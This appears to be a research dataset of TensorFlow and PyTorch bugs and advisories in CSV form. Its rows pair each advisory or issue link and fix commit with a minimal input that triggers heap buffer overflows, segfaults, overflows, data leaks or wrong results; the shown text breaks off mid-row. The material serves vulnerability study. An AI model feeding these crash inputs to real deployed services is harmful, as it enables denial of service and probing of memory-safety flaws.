+Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-jc87-6vpp-7ff3,https://github.com/tensorflow/tensorflow/commit/3cbb917b4714766030b28eba9fb41bb97ce9ee02,tf.raw_ops,tf.raw_ops.RaggedCountSparseOutput,Dimension mismatch,"indices = [[0, 0], [0, 1], [1, 0]]
+values = [1, 1, 1, 10]","indices
+values",N.A,heap buffer overflow,N.A
+Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-jc87-6vpp-7ff3,https://github.com/tensorflow/tensorflow/commit/3cbb917b4714766030b28eba9fb41bb97ce9ee02,tf.raw_ops,tf.raw_ops.RaggedCountSparseOutput,Dimension mismatch,splits = [],splits,N.A,heap buffer overflow,N.A
+Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-jc87-6vpp-7ff3,https://github.com/tensorflow/tensorflow/commit/3cbb917b4714766030b28eba9fb41bb97ce9ee02,tf.raw_ops,tf.raw_ops.RaggedCountSparseOutput,First element other than zero,"splits = [1, 7]",splits,N.A,heap buffer overflow,N.A
+Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-jc87-6vpp-7ff3,https://github.com/tensorflow/tensorflow/commit/3cbb917b4714766030b28eba9fb41bb97ce9ee02,tf.raw_ops,tf.raw_ops.RaggedCountSparseOutput,Rank other than 2,"indices = [[[0], [0]], [[0], [1]], [[1], [0]], [[1], [2]]]",indices,N.A,heap buffer overflow,N.A
+Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-jc87-6vpp-7ff3,https://github.com/tensorflow/tensorflow/commit/3cbb917b4714766030b28eba9fb41bb97ce9ee02,tf.raw_ops,tf.raw_ops.RaggedCountSparseOutput,split[-1] != len(values),"splits = [0, 5]
+values = [1, 1, 2, 1, 2, 10, 5]","indices
+values",N.A,heap buffer overflow,N.A
+Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-g7p5-5759-qv46,https://github.com/tensorflow/tensorflow/commit/0462de5b544ed4731aa2fb23946ac22c01856b80,tf.raw_ops,tf.raw_ops.StringNGrams,Invalid argument,"data=[""aa"", ""bb"", ""cc"", ""dd"", ""ee"", ""ff""]",data,N.A,data leak,N.A
+Pytorch,N.A,https://github.com/pytorch/pytorch/commit/b6b1c01adfdadf93a4a1d30c3661ff177412a876,torch,torch.view_as_complex,Zero argument,z = torch.tensor(2.0),z,N.A,segfault,Denial of service
+Pytorch,https://github.com/pytorch/pytorch/commit/c010ef7f0c6d837809a7e973048afac76373e3de,https://github.com/pytorch/pytorch/issues/43476,torch.nn,torch.nn.Conv3d,N.A,"torch.backends.cudnn.enabled=False
+x = torch.rand(1, 32, 512, 512, 256).to('cuda:0')
+m = torch.nn.Conv3d(32, 1, kernel_size=1, padding=0,stride=1,bias=False).to('cuda:0')
+x = m(x)",x,N.A,N.A,runtime error
+Pytorch,https://github.com/pytorch/pytorch/commit/42b4a7132e7c6f1df963b473d1583e4791fb1808,https://github.com/pytorch/pytorch/issues/41780,torch,torch.nn.functional.embedding,scalar input,"input = torch.tensor((np.random.rand(2,2)*100).astype('int64'))
+weight = torch.tensor(1)
+torch.nn.functional.embedding(input, weight)",weight,N.A,segfault,Denial of service
+Pytorch,https://github.com/pytorch/pytorch/issues/42281,https://github.com/pytorch/pytorch/issues/42281,torch,torch.Generator,Invalid argument,device='cuda',device,N.A,segfault,Denial of service
+Pytorch,https://github.com/pytorch/pytorch/issues/24137,https://github.com/pytorch/pytorch/commit/366c014a7799f0b7bbc258fd6c271dadb99d1de0,torch,torch.distributed.broadcast,Boolean dtype,"scalar_tensor = torch.tensor(scalar).to(device)
+with torch.no_grad(): scalar_tensor = dist.broadcast(scalar_tensor, src)",scalar_tensor,N.A,N.A,RuntimeError: Unsupported data type
+Pytorch,https://github.com/pytorch/pytorch/issues/327,https://github.com/PyTorch/PyTorch/commit/7773a45c0d2cba1cd53d7f50b00baa7ae95ec6e4,torch,torch.IntTensor,Integer tensors,"a = torch.IntTensor([0,1])
+b = torch.IntTensor([0,1])
+print(a.div(b))",N.A,N.A,segfault,Denial of service
+Pytorch,https://github.com/pytorch/pytorch/issues/327,https://github.com/PyTorch/PyTorch/commit/7773a45c0d2cba1cd53d7f50b00baa7ae95ec6e4,torch,torch.FloatTensor,Integer tensors,"a = torch.FloatTensor([1,1])
+b = torch.FloatTensor([0,0])
+a.div(b)",N.A,N.A,RuntimeError: inconsistent tensor size,N.A
+Pytorch,https://github.com/pytorch/pytorch/pull/38970,https://github.com/pytorch/pytorch/commit/5702a28b2612a104204dd31e800faaaa09bdd458,torch.nn,torch.nn.ConvTranspose3d,Very large input argument,"        in_channels = 64
+        out_channels = 128
+        kernel_size = 5
+
+        conv = torch.nn.ConvTranspose3d(
+            in_channels, out_channels, kernel_size=kernel_size,
+            stride=2, padding=2, output_padding=1).to(device)
+
+        x = torch.rand([1, 64, 8, 128, 172]).to(device)
+        y = conv(x)",N.A,N.A,N.A,integer overflow
+Pytorch,https://github.com/pytorch/pytorch/issues/38764,https://github.com/PyTorch/PyTorch/commit/e4a3c584d51662d4c14060fc8517464fe3c12142,torch,torch.nn.functional.max_pool1d,Very large input argument,"x = 6.
+size = 10. ** 6
+print(f""Size of second dimension: {int(size)}"")
+poolsize = 4
+x = torch.rand((1,int(size),poolsize), requires_grad=True).to('cuda:0')
+y = F.max_pool1d(x.contiguous(), kernel_size=poolsize, stride=None, padding=0)
+
+loss = torch.sum(y)
+loss.backward()",N.A,N.A,N.A,Illegal memory acces
+Pytorch,N.A,https://github.com/pytorch/pytorch/commit/63b1ae69831cd21bc4d6059a5854bc1155a152c9,torch,torch.remainder,Very large input argument,"a = torch.tensor([avalue], dtype=dtype, device=device)
+b = torch.tensor([bvalue], dtype=dtype, device=device)
+c = torch.remainder(a, b)",N.A,N.A,N.A,overflow
+Pytorch,N.A,https://github.com/pytorch/pytorch/commit/7aec364bdf9ed7297b77e8445a6a6d4116265dde,torch,torch.gather,ind.dim != output.dim,"""k0 = 8
+k1 = 8
+m = 100
+
+x = torch.rand((k0, k1))
+ind = torch.randint(0, k0, (m, k1))
+output = torch.empty((m, k1))""
+print(torch.gather(x, 0, ind, out=output))
+print(torch.gather(x, 1, ind, out=output))""",N.A,N.A,segfault,Denial of service
+Pytorch,https://github.com/pytorch/pytorch/issues/33300,https://github.com/pytorch/pytorch/commit/8291e06f8fb14a09e6c3b7a740a182250069242c,torch,torch.zeros().numpy,Invalid argument,"device=""cuda""",device,N.A,segfault,Denial of service
+Pytorch,https://github.com/pytorch/pytorch/issues/33001,https://github.com/pytorch/pytorch/commit/60339a38eded68eeef91f84734b4d665ddf4e080,torch,torch.FloatTensor,Single element list,"v = torch.FloatTensor(1, 135).fill_(0) v[0, [1]] += 2",N.A,N.A,segfault,Denial of service
+Pytorch,N.A,https://github.com/pytorch/pytorch/commit/a64d0ffe81b250889a3e6670daa9c7d07d946e32,torch.nn.functional,torch.nn.functional.pdist,batch sizes >= 46342,"x = torch.randn(46342, 1, device='cuda', requires_grad=True)
+out = torch.pdist(x)
+out.mean().backward()",N.A,N.A,N.A,illegal CUDA memory access
+Pytorch,N.A,https://github.com/pytorch/pytorch/commit/ddff014b79303e5239d5cb876ba97143cad6405a,torch.utils.tensorboard,torch.utils.tensorboard.SummaryWriter.add_images,uint8 NCHW tensor,"from torch.utils.tensorboard import SummaryWriter
+
+writer = SummaryWriter()
+x=torch.tensor([[[[1, 2, 3], [4, 5, 6]]]], dtype=torch.uint8)
+writer.add_images(""images"", x)",N.A,N.A,overflow,wrong results
+Pytorch,N.A,https://github.com/pytorch/pytorch/commit/136bb07a93b779acbc84ff341bc397551a8cfcc2,torch,torch.histc,inf,"torch.histc(torch.tensor([float(""inf"")], dtype=torch.float, device=device),
+                        bins=1, min=0, max=3),
+            torch.tensor([0], dtype=torch.float, device=device)",N.A,N.A,segfault,Denial of service
+Pytorch,N.A,https://github.com/pytorch/pytorch/commit/ec8e75ea92ae2b5ea73b4aeb3ec7cb39e9f95db9,torch,torch.sum,Invalid argument,"t = torch.zeros([10], dtype=torch.int32, device='cuda')
+# 35488 * 65536 as int32 would cause overflow to negative value
+# giving negative bin offset
+t[0] = 35488
+counted = t.bincount(minlength=65536)
+torch.sum(counted)",N.A,N.A,overflow,N.A
+Pytorch,https://github.com/pytorch/pytorch/issues/24309,https://github.com/pytorch/pytorch/commit/c845984271a551ac1c61b9eb06a17fb57aafbd7e,torch.nn,nn.AvgPool2d,Invalid argument,"kernel_size=2
+stride=1","kernel_size
+stride",N.A,N.A,Illegal memory acces
+Pytorch,N.A,https://github.com/pytorch/pytorch/commit/74828be4a7d0d2dba3f0ec3f6e79265cdfae5329,torch,torch.cat,Very large input argument,"SIZE1 = 6500
+SIZE2 = 4500
+concat_list = []
+concat_list.append(torch.ones((SIZE1, 1024 * 512), dtype=torch.uint8))
+concat_list.append(torch.ones((SIZE2, 1024 * 512), dtype=torch.uint8))
+result = torch.cat(concat_list)",N.A,N.A,segfault,N.A
+Pytorch,N.A,https://github.com/pytorch/pytorch/commit/071971476d7431a24e527bdc181981678055a95d,torch.distributions.binomial,torch.distributions.binomial.Binomial,Very large input argument,"logits = torch.tensor([-100., 100.], dtype=torch.float)
+total_count = 1.
+x = torch.tensor([0., 0.], dtype=torch.float)
+log_prob = Binomial(total_count, logits=logits).log_prob(x)",N.A,N.A,overflow,N.A
+Pytorch,N.A,https://github.com/pytorch/pytorch/commit/071971476d7431a24e527bdc181981678055a95d,torch.distributions.binomial,torch.distributions.binomial.Binomial,Very large input argument,"x = torch.tensor(0., requires_grad=True)
+y = Binomial(total_count, logits=x).log_prob(torch.tensor(0.))",N.A,N.A,overflow,N.A
+Pytorch,N.A,https://github.com/pytorch/pytorch/commit/d4712ee218cd6af3c2096ca7a76fef350173b703,torch,torch.isinf,Integer tensors,"t1 = cast(torch.Tensor([1, inf, 2, -inf, nan]))
+t2 = cast(torch.ByteTensor([1, 2, 3]))
+t3 = cast(torch.CharTensor([1, 2, 3]))
+t4 = cast(torch.ShortTensor([1, 2, 3]))
+t5 = cast(torch.IntTensor([1, 2, 3]))
+t6 = cast(torch.LongTensor([1, 2, 3]))
+torch.isinf(t1), cast(torch.ByteTensor([0, 1, 0, 1, 0]))
+torch.isinf(t2), cast(torch.ByteTensor([0, 0, 0]))
+torch.isinf(t3), cast(torch.ByteTensor([0, 0, 0]))
+torch.isinf(t4), cast(torch.ByteTensor([0, 0, 0]))
+torch.isinf(t5), cast(torch.ByteTensor([0, 0, 0]))
+torch.isinf(t6), cast(torch.ByteTensor([0, 0, 0]))",N.A,N.A,RuntimeError: value cannot be converted to type int16_t without overflow: inf,N.A
+Pytorch,https://github.com/pytorch/pytorch/issues/13324,https://github.com/pytorch/pytorch/commit/e4bb56570c7d6c7e17a85cbface4828c62a33564,torch.nn.utils.rnn,torch.nn.utils.rnn.pack_padded_sequence,input in increasing order,"a = torch.ones(25, 300)
+b = torch.ones(22, 300)
+b_a = pad_sequence([b, a])
+pack_padded_sequence(b_a, [22, 25])",N.A,N.A,segfault,crash
+Pytorch,https://github.com/pytorch/pytorch/issues/9264,https://github.com/pytorch/pytorch/commit/1597fc594d36a18d1d4aee16d09ea49ae7065610,torch.nn,torch.nn.Conv3d,Specific tensor size,"import torch.nn as nn
+mod = nn.Conv3d(96, 256, 4, 1, 0, 2)     # does not crash with dilation = 1
+mod(torch.zeros([1, 96, 111, 63, 111]))",N.A,N.A,segfault,Denial of service
+Pytorch,https://github.com/pytorch/pytorch/pull/3470,https://github.com/pytorch/pytorch/commit/f7a459b28b184dedf265ed8718f85cb483e8284e,torch,torch.svd,Invalid argument,"x = torch.zeros(300, 100001).cuda()
+u, s, v = torch.svd(x, some=True)",N.A,N.A,overflow,N.A
+Pytorch,https://github.com/pytorch/pytorch/issues/3498,https://github.com/pytorch/pytorch/commit/6fde0cb507d59d2a9168f3051feba6865e9d1048,torch,N.A,NaN input,"np_arr = np.ones(100).astype(np.float32)
+ tensor = torch.from_numpy(np_arr[None]) # Issue seems to be use of [None] or [np.newaxis]
+variable = Variable(tensor)
+output = model(variable)",N.A,N.A,memory leak,N.A
+Pytorch,https://github.com/pytorch/pytorch/issues/86326,N.A,torch,torch.round,Integer tensors,"import torch
+t = torch.tensor([2], dtype=torch.int16)
+torch.round(t, decimals=1)",N.A,N.A,N.A,RuntimeError
+Pytorch,https://github.com/pytorch/pytorch/issues/86279,N.A,torch,torch.multinomial,Very large input argument,"torch.multinomial(torch.ones(1, 32768, device='mps'), 2, replacement=True)",input,N.A,N.A,crash
+Pytorch,https://github.com/pytorch/pytorch/issues/86162,N.A,torch.nn.functional,torch.nn.functional.one_hot,int32 and int16 tensor,N.A,N.A,N.A,N.A,RuntimeError
+Pytorch,https://github.com/pytorch/pytorch/issues/86074,N.A,torch,torch.remainder,Integer input,"input = torch.tensor(1693446850, dtype=torch.int32)
+other = torch.tensor([7285], dtype=torch.int16)
+
+# test the apis with int input (wrong results)
+r = torch.remainder(input, other)","input
+other",N.A,N.A,Wrong results
+Pytorch,https://github.com/pytorch/pytorch/pull/86064,N.A,torch,torch.fmod,Integer input,"input = torch.tensor(1693446850, dtype=torch.int32)
+other = torch.tensor([7285], dtype=torch.int16)
+
+# test the apis with int input (wrong results)
+r = torch.fmod(input, other)","input
+other",N.A,N.A,Wrong results
+Pytorch,https://github.com/pytorch/pytorch/issues/85852,N.A,torch,torch.mm,Same input and output ,"A = torch.rand(50, 50)
+B = torch.clone(A).cuda()
+C = torch.clone(A)
+torch.mm(C, C, out=C)",out,N.A,N.A,Wrong results
+Pytorch,https://github.com/pytorch/pytorch/issues/85217,N.A,torch,torch.native_batch_norm,Invalid argument,"input = torch.full((5, 5,), 1, dtype=torch.float64, requires_grad=False)
+weight = torch.full((14, 9, 12, 0, 6, 0, 15, 0, 0, 0,), -1.5e+300, dtype=torch.float64, requires_grad=False)
+bias = torch.full((5,), 1, dtype=torch.float64, requires_grad=False)
+running_mean = torch.full((0,), 1, dtype=torch.float64, requires_grad=False)
+running_var = torch.full((0,), 1, dtype=torch.float64, requires_grad=False)
+training = True
+momentum = 0
+eps = 0
+torch.native_batch_norm(input, weight, bias, running_mean, running_var, training, momentum, eps)","nput, weight, bias, running_mean, running_var, training, momentum, eps",N.A,segfault,Denial of service
+Pytorch,https://github.com/pytorch/pytorch/issues/85216,N.A,torch,torch._mkldnn_transpose,Invalid argument,"self = torch.full((3, 4, 5,), 1, dtype=torch.float32, requires_grad=False).to_mkldnn()
+dim0 = 1250999896764
+dim1 = 0
+torch._mkldnn_transpose(self, dim0, dim1)","self, dim0, dim1",N.A,segfault,Denial of service
+Pytorch,https://github.com/pytorch/pytorch/issues/85214,N.A,torch._C._nn,torch._C._nn.mkldnn_reorder_conv2d_weight,Invalid argument,"self = torch.full((3, 3, 1, 1,), 1, dtype=torch.float32, requires_grad=False).to_mkldnn()
+padding = []
+stride = [65534, 65534]
+dilation = [65534, 65534]
+groups = 0
+torch._C._nn.mkldnn_reorder_conv2d_weight(self, padding, stride, dilation, groups)","self, padding, stride, dilation, groups",N.A,segfault,Denial of service
+Pytorch,https://github.com/pytorch/pytorch/issues/85213,N.A,torch._C._nn,torch._C._nn.mkldnn_reorder_conv3d_weight,Invalid argument,"self = torch.full((32, 3, 3, 3, 3,), 1, dtype=torch.float32, requires_grad=False).to_mkldnn()
+padding = []
+stride = [1250999896764, 1250999896764, 1250999896764]
+dilation = [1250999896764, 1250999896764, 1250999896764]
+groups = 0
+torch._C._nn.mkldnn_reorder_conv3d_weight(self, padding, stride, dilation, groups)","self, padding, stride, dilation, groups",N.A,segfault,Denial of service
+Pytorch,https://github.com/pytorch/pytorch/issues/85072,N.A,torch.jit,torch.jit.wait,None,"import torch
+
+torch.jit.wait(None)",N.A,N.A,segfault,Denial of service
+Pytorch,https://github.com/pytorch/pytorch/issues/84990,N.A,torch.futures,torch.futures.collect_all,Invalid argument,"import torch
+
+input = (None,)
+
+torch.futures.collect_all(futures=input)",futures,N.A,segfault,Denial of service
+Pytorch,https://github.com/pytorch/pytorch/issues/84979,N.A,torch.nn.functional,torch.nn.functional.pad generates,Invalid argument,value=0,value,N.A,N.A,wrong results
+Pytorch,https://github.com/pytorch/pytorch/issues/83585,N.A,torch.profiler,torch.profiler.profile,Optional parameter,"import torch
+import torchvision.models as models
+from torch.profiler import profile, record_function, ProfilerActivity
+model = models.resnet18().cuda()
+inputs = torch.randn(5, 3, 224, 224).cuda()
+model = torch.jit.script(model)
+model = torch.jit.optimize_for_inference(model)
+
+with profile(activities=[ProfilerActivity.CPU], with_stack=True) as prof:
+    model(inputs)",with_stack,N.A,segfault,Denial of service
+Pytorch,https://github.com/pytorch/pytorch/issues/83494,N.A,torch,torch.pinverse,3*3 tensor,"import torch
+A  = torch.tensor([[0.0, 1.0, -1.0], [1.0, -1.0, 0.0], [-1.0, 1.0, 0.0]])
+Apinv = torch.pinverse(A)
+print(A @ Apinv @ A)
+print(torch.dist(A @ Apinv @ A, A))",input,N.A,N.A,wrong results
+Pytorch,https://github.com/pytorch/pytorch/issues/83328,N.A,torch.nn,torch.nn.Conv2d,Unsupported dtype,"results = dict()
+import torch
+arg_class = torch.nn.Conv2d(512,2048,1)
+arg_1 = torch.rand([128, 512, 16, 16], dtype=torch.float16)
+results[""time_low""] = arg_class(arg_1)","in_channels, out_channels, kernel_size",N.A,check failure,Denial of service
+Pytorch,https://github.com/pytorch/pytorch/issues/83229,N.A,torch.nn,torch.nn.MaxUnpool2d,Negative argument,"arg_1 = -100
+arg_2 = False
+arg_class = torch.nn.MaxUnpool2d(arg_1,stride=arg_2,)",kernel_size,N.A,N.A,N.A
+Pytorch,https://github.com/pytorch/pytorch/issues/83221,N.A,torch.nn,torch.nn.MaxUnpool3d,Negative argument,"unpool = torch.nn.MaxUnpool3d(-3, stride=2)",kernel_size,N.A,N.A,N.A
+Pytorch,https://github.com/pytorch/pytorch/issues/83175,N.A,torch.nn,torch.nn.GRU,Very large input argument,"import torch
+results={}
+arg_1 = 10
+arg_2 = 20
+arg_3 = 100000
+arg_class = torch.nn.GRU(arg_1,arg_2,arg_3,)",num_layers,N.A,N.A,Hang
+Pytorch,https://github.com/pytorch/pytorch/issues/83152,N.A,torch.nn,torch.nn.functional.fold,Very large input argument,"import torch
+results={}
+arg_1_tensor = torch.rand([1, 12, 12], dtype=torch.float32)
+arg_1 = arg_1_tensor.clone()
+arg_2 = [4,5,]
+arg_3 = [2,2,]
+arg_4 = 1
+arg_5 = 36028797018963968
+arg_6 = 1
+results['res'] = torch.nn.functional.fold(arg_1,arg_2,arg_3,arg_4,arg_5,arg_6,)",padding,N.A,N.A,Hang
+Pytorch,https://github.com/pytorch/pytorch/issues/82635,N.A,torch,torch.min,equal input,N.A,N.A,N.A,N.A,wrong results
+Pytorch,https://github.com/pytorch/pytorch/issues/82282,N.A,torch,torch.matrix_exp,NaN input,"import torch
+torch.random.manual_seed(420)
+input = torch.randn(3, 3, dtype=torch.float32)
+output = torch.matrix_exp(torch.log(input * 2 - 1))
+input = input.cuda()
+output = torch.matrix_exp(torch.log(input * 2 - 1))",A,N.A,N.A,wrong results
+Pytorch,https://github.com/pytorch/pytorch/issues/81409,N.A,torch._C._nn,torch._C._nn.adaptive_avg_pool2d,Invalid argument,"from __future__ import annotations
+import sys
+import torch
+
+if __name__ == '__main__':
+    assert len(sys.argv) == 5
+    Ih, Iw, Oh, Ow = map(int, sys.argv[1:])
+    _input_size = (Ih, Iw)
+    _output_size = (Oh, Ow)
+
+    torch.manual_seed(0)  # it seems seed value is irrelevant as far as I checked
+    imgs = torch.randint(low=0, high=256, size=(1,)+_input_size).type(torch.float32)
+    imgs_ = torch._C._nn.adaptive_avg_pool2d(imgs, _output_size)",N.A,N.A,segfault,Denial of service
+Pytorch,https://github.com/pytorch/pytorch/issues/81195,N.A,torch,torch._weight_norm,Dimension mismatch,"a = torch.Tensor([[1,2],[3,4]])
+b = torch.Tensor([[5],[6]])
+torch._weight_norm(a,b,dim=1)","a
+b
+dim",N.A,N.A,wrong results
+Pytorch,https://github.com/pytorch/pytorch/issues/80946,N.A,torch.nn.functional,torch.nn.functional.linear,Multi-dimensional bias,"F.linear(torch.randn(2,3,5),torch.randn(7,5),torch.randn(2,3,7))","bias=torch.randn(2,3,7)",N.A,N.A,wrong results
+Pytorch,https://github.com/pytorch/pytorch/issues/80805,N.A,torch,torch.einsum,Invalid argument,"import torch
+As = torch.randn(3, 2, 5)
+Bs = torch.randn(3, 5, 4)
+torch.einsum(""bij,bjk->bik"", As, Bs)",N.A,N.A,segfault,wrong results
+Pytorch,https://github.com/pytorch/pytorch/issues/80804,N.A,torch,torch.renorm,Empty input,"def fn(input):
+    p = 2
+    dim = -1
+    maxnorm = 0
+    fn_res = torch.renorm(input, p, dim, maxnorm, )
+    return fn_res
+input = torch.tensor([[0.1, 0.], [0., 0.]], dtype=torch.float64, requires_grad=True)
+
+torch.autograd.gradcheck(fn, (input))","p = 2
+maxnorm = 0",N.A,N.A,wrong results
+Pytorch,https://github.com/pytorch/pytorch/issues/80588,N.A,torch,torch.baddbmm,Invalid argument,"import torch 
+
+for i in range(10000):
+    out = torch.baddbmm(
+        torch.zeros([1, 1, 1], dtype=torch.float32),
+        torch.FloatTensor([[[1]]]),
+        torch.FloatTensor([[[1]]]),
+        beta=0,
+    )
+    assert not torch.isnan(out).any(), i",N.A,N.A,N.A,
+Pytorch,https://github.com/pytorch/pytorch/issues/80488,N.A,torch.nn.functional,torch.nn.functional.kl_div,Invalid argument,"inout = torch.tensor([[1,2,3], [5.0, 5.0, 5.0]])
+target = torch.tensor([[1,2,3], [5.0, 5.0, 5.0]])","input
+target",N.A,N.A,wrong results
+Pytorch,https://github.com/pytorch/pytorch/issues/78153,N.A,torch.nn.utils.rnn,torch.nn.utils.rnn.pack_sequence,Invalid argument,"import torch
+sequences_0 = torch.rand([1, 16, 86], dtype=torch.float32)
+sequences_1 = torch.rand([1, 85, 0], dtype=torch.float16)
+sequences_2 = torch.randint(0, 2, [2, 84, 85], dtype=torch.bool)
+sequences_3 = torch.randint(-8, 2, [0, 4, 85], dtype=torch.int8)
+sequences = [sequences_0,sequences_1,sequences_2,sequences_3,]
+enforce_sorted = 0
+torch.nn.utils.rnn.pack_sequence(sequences, enforce_sorted=enforce_sorted, )","sequences, enforce_sorted=enforce_sorted",N.A,segfault,Denial of service
+Pytorch,https://github.com/pytorch/pytorch/issues/78131,N.A,torch,torch._pad_packed_sequence,Empty input,"import torch
+
+data = torch.full([1, 1, 1, 1], -10000, dtype=torch.float16, requires_grad=False)
+batch_sizes = torch.full([0], 978, dtype=torch.int64, requires_grad=False)
+batch_first = True
+padding_value = False
+total_length = torch.full([], -9937, dtype=torch.int64, requires_grad=False)
+print(torch._pad_packed_sequence(data, batch_sizes, batch_first, padding_value, total_length))",batch_sizes,N.A,segfault,Denial of service
+Pytorch,https://github.com/pytorch/pytorch/issues/78130,N.A,torch,torch._grid_sampler_2d_cpu_fallback,Invalid argument,"import torch
+
+input = torch.full([3, 3, 3, 2], 9490, dtype=torch.float32, requires_grad=False)
+grid = torch.full([0, 3, 8, 2, 4, 1], -9545, dtype=torch.float32, requires_grad=False)
+interpolation_mode = 8330
+padding_mode = 5934
+align_corners = False
+torch._grid_sampler_2d_cpu_fallback(input, grid, interpolation_mode, padding_mode, align_corners)",N.A,N.A,segfault,Denial of service
+Pytorch,https://github.com/pytorch/pytorch/issues/78129,N.A,torch,torch._embedding_bag_forward_only,Empty input,"import torch
+
+weight = torch.full([2, 2, 5, 3, 3], -8670, dtype=torch.float64, requires_grad=False)
+indices = torch.full([3, 0, 1], -4468, dtype=torch.int32, requires_grad=False)
+offsets = torch.full([7, 1, 0], -7226, dtype=torch.int64, requires_grad=False)
+scale_grad_by_freq = True
+mode = torch.full([], 6318, dtype=torch.int64, requires_grad=False)
+sparse = False
+per_sample_weights = torch.full([3], -8750, dtype=torch.int64, requires_grad=False)
+include_last_offset = False
+padding_idx = torch.full([], 6383, dtype=torch.int64, requires_grad=False)
+
+print(torch._embedding_bag_forward_only(weight, indices, offsets, scale_grad_by_freq, mode,
+                                  sparse, per_sample_weights, include_last_offset, padding_idx))",N.A,N.A,segfault,Denial of service
+Pytorch,https://github.com/pytorch/pytorch/issues/78128,N.A,torch,torch._C._nn.thnn_conv2d,Empty input,"import torch
+
+tensor_0 = torch.full([3, 3, 3], -4398, dtype=torch.float64, requires_grad=False)
+tensor_1 = torch.full([6, 7], -4532, dtype=torch.int32, requires_grad=False)
+intarrayref_2 = -10000
+tensor_3 = torch.full([3, 3, 3, 6, 7], -2321, dtype=torch.float16, requires_grad=False)
+intarrayref_4 = -2807
+intarrayref_5 = []
+torch._C._nn.thnn_conv2d(tensor_0, tensor_1, intarrayref_2, tensor_3, intarrayref_4, intarrayref_5)",intarrayref_5,N.A,segfault,Denial of service
+Pytorch,https://github.com/pytorch/pytorch/issues/78127,N.A,torch,torch._C._nn.reflection_pad2d,Empty input,"import torch
+
+tensor_0 = torch.full([6, 5, 7], -8754, dtype=torch.int32, requires_grad=False)
+intarrayref_1 = []
+torch._C._nn.reflection_pad2d(tensor_0, intarrayref_1)",intarrayref_1,N.A,segfault,Denial of service
+Pytorch,https://github.com/pytorch/pytorch/issues/78126,N.A,torch,torch._C._nn.max_unpool3d,Empty input,"import torch
+
+tensor_0 = torch.full([], -10000, dtype=torch.int64, requires_grad=False)
+tensor_1 = torch.full([7, 7, 7, 4, 4, 4, 7, 7], -8695, dtype=torch.float16, requires_grad=False)
+intarrayref_2 = []
+intarrayref_3 = 7052
+intarrayref_4 = -9995
+torch._C._nn.max_unpool3d(tensor_0, tensor_1, intarrayref_2, intarrayref_3, intarrayref_4)",intarrayref_2,N.A,segfault,Denial of service
+Pytorch,https://github.com/pytorch/pytorch/issues/78125,N.A,torch,torch.grid_sampler_3d,Invalid argument,"import torch
+
+input = torch.full([4, 2, 0, 0, 4, 0, 0, 3], -1480, dtype=torch.float64, requires_grad=False)
+grid = torch.full([1, 6, 3, 5, 3, 4, 0, 6], -2024, dtype=torch.float64, requires_grad=False)
+interpolation_mode = -3278
+padding_mode = -1469
+align_corners = True
+torch.grid_sampler_3d(input, grid, interpolation_mode, padding_mode, align_corners)",N.A,N.A,segfault,Denial of service
+Pytorch,https://github.com/pytorch/pytorch/issues/78123,N.A,torch,torch.choose_qparams_optimized,Invalid argument,"import torch
+
+input = torch.full([7, 7, 4, 6, 3, 1, 2], -7124, dtype=torch.float32, requires_grad=False)
+numel = -8192
+n_bins = 1255
+ratio = -9185
+bit_width = -4519
+torch.choose_qparams_optimized(input, numel, n_bins, ratio, bit_width)",N.A,N.A,segfault,Denial of service
+Pytorch,https://github.com/pytorch/pytorch/issues/78122,N.A,torch,torch.bincount,Invalid argument,"import torch
+
+self = torch.full([3], 2550, dtype=torch.int64, requires_grad=False)
+weights = torch.full([3, 1, 3, 0, 0, 0, 1, 1], -4620, dtype=torch.int64, requires_grad=False)
+minlength = 9711
+torch.bincount(self, weights, minlength)",N.A,N.A,segfault,Denial of service
+Pytorch,https://github.com/pytorch/pytorch/issues/77893,N.A,torch,torch._remove_batch_dim,Invalid argument,"import torch
+
+self = torch.full((5, 5, 5, 5, 5,), 1, dtype=torch.float64, requires_grad=False)
+level = 0
+batch_size = 0
+out_dim = 1250999896764
+torch._remove_batch_dim(self, level, batch_size, out_dim)",N.A,N.A,segfault,Denial of service
+Pytorch,https://github.com/pytorch/pytorch/issues/77493,N.A,torch,torch.pow,Same dtype,"input = input_tensor.clone().requires_grad_()
+exponent = exponent_tensor.clone()
+with forward_ad.dual_level():
+    tangent = torch.rand_like(input)
+    dual_input = forward_ad.make_dual(input, tangent)
+    dual_output = torch.pow(dual_input, exponent)","input
+exponent",N.A,segfault,Denial of service
+Pytorch,https://github.com/pytorch/pytorch/issues/77231,N.A,torch,torch.scatter_add,Complex tensor,"import torch
+from torch.autograd import gradcheck
+
+input_tensor = torch.rand([10, 5], dtype=torch.float64, requires_grad=True)
+index_tensor = torch.rand([13, 0], dtype=torch.complex128, requires_grad=True)
+src_tensor = torch.rand([10, 2], dtype=torch.float64, requires_grad=True)
+
+def fn(input, index, src):
+    dim = -1
+    fn_res = torch.scatter_add(input, dim, index, src, )
+    return fn_res
+
+print(gradcheck(fn, (input_tensor, index_tensor, src_tensor)))",index_tensor,N.A,N.A,runtime error
+Pytorch,https://github.com/pytorch/pytorch/issues/76778,N.A,torch,torch.addmv,Type confusion,"import torch
+input = torch.rand([2], dtype=torch.float64, requires_grad=True)
+mat = torch.rand([2, 3], dtype=torch.complex128, requires_grad=True)
+vec = torch.rand([3], dtype=torch.complex128, requires_grad=True)
+
+res = torch.addmv(input, mat, vec)
+print(""addmv SUCCEED!"")
+
+res_2 = res.sum()
+print(""sum SUCCEED!"")
+
+res_2.backward()","input
+mat
+vec",N.A,N.A,runtime error
+Pytorch,https://github.com/pytorch/pytorch/issues/76571,N.A,torch,torch.unique,NaN input,"import torch
+
+def unique(x):
+    return torch.unique(x, sorted=False, return_inverse=False, return_counts=True)
+
+s = torch.tensor(0.).cuda()
+x = torch.tensor(float('nan')).cuda()
+
+print(unique(s))
+print(unique(x)) # <- these two calls have different outputs
+print(unique(x)) # <-",x,N.A,N.A,wrong results
+Pytorch,https://github.com/pytorch/pytorch/issues/75171,N.A,torch,torch.jit.load,ASCII character input,"import torch
+
+torch.jit.load('C:\\Users\\流星暴雨/.cache/clip\\ViT-B-16.pt', ""cpu"")",N.A,N.A,N.A,runtime error
+Pytorch,https://github.com/pytorch/pytorch/issues/74809,N.A,torch.distributed,torch.distributed.gather,Non-contiguous NumPy array,"import os
+import time
+import torch
+import numpy as np
+import torch.distributed as dist
